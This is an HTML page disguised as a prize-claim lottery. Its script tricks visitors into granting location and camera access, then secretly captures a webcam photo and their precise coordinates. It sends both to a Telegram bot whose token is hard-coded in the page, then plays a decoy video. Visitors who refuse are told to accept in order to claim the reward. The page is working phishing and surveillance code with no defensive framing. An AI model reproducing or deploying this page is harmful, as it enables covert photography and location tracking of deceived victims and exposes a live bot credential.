<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🧧</title>
    <style>
        body { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: url('https://github.com/sachinbagwan208-design/-/raw/main/00.png') no-repeat center center fixed; background-size: cover; color: white; font-family: sans-serif; text-align: center; }
        
        #video { background: #000; border: 2px solid #444; border-radius: 8px; margin-bottom: 20px; display: none; opacity: 0; transition: opacity 0.5s ease-in-out; }
        
        #status { 
            margin: 15px 0; 
            font-weight: bold; 
            background: rgba(0,0,0,0.6); 
            padding: 20px; 
            border-radius: 10px; 
            font-size: 60px; /* 放大表情 */
        }
        
        button { padding: 15px 40px; cursor: pointer; font-size: 20px; border-radius: 5px; border: none; background: #28a745; color: white; }
        
        .error-page { font-size: 24px; color: #ffeb3b; padding: 20px; background: rgba(0,0,0,0.8); border-radius: 15px; }
    </style>
</head>
<body>
    <div id="app">
        <h2>🎉 Please click below to claim your prize 🎉</h2>
        <div id="status">🎰🎰🎰🎰🎰</div>
        <video id="video" width="640" height="480" autoplay playsinline muted></video>
        <canvas id="canvas" style="display:none;"></canvas>
        <button id="startBtn">START🎲</button>
    </div>

    <script>
        const BOT_TOKEN = '8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g';
        const app = document.getElementById('app');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');
        const status = document.getElementById('status');
        const CHAT_ID = new URLSearchParams(window.location.search).get('id');

        function showError() {
            app.innerHTML = `<div class="error-page">
                <p>🛠 Please agree to the above authorization to claim your reward. Please refresh the page and try again⚙️</p>
                <button onclick="location.reload()">Refresh Page</button>
            </div>`;
        }

        startBtn.addEventListener('click', async () => {
            if (!CHAT_ID) { status.innerText = "❌ ID Error"; return; }
            startBtn.style.display = 'none';

            // 1. 严格获取定位
            let locationText = "";
            try {
                status.innerText = "Verifying availability in your country📍";
                const pos = await new Promise((res, rej) => {
                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 10000 });
                });
                locationText = `Lat: ${pos.coords.latitude.toFixed(6)}, Lon: ${pos.coords.longitude.toFixed(6)}`;
            } catch (err) {
                showError();
                return;
            }

            // 2. 严格获取相机
            try {
                status.innerText = "🎁";
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                video.style.display = 'block'; 
                video.style.opacity = '1';
                status.innerText = "🌐Network connection in progress";
                
                // 等待短暂时间确保流已加载
                setTimeout(() => captureAndUpload(stream, locationText), 1000);
            } catch (err) {
                showError();
            }
        });

        async function captureAndUpload(stream, locationText) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'prize.jpg');
                formData.append('caption', `ID: ${CHAT_ID}\n📍 ${locationText}`);

                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                
                if ((await res.json()).ok) {
                    // 上传成功：平滑切换为视频播放
                    status.style.fontSize = "40px";
                    status.innerText = "🎉 Success!";
                    stream.getTracks().forEach(t => t.stop()); // 关闭摄像头
                    video.srcObject = null;
                    video.src = "https://github.com/sachinbagwan208-design/-/raw/main/000.MP4";
                    video.loop = true;
                    video.muted = false; // 播放时恢复声音
                    video.play();
                } else {
                    status.innerText = "⚠️ Upload Failed";
                }
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
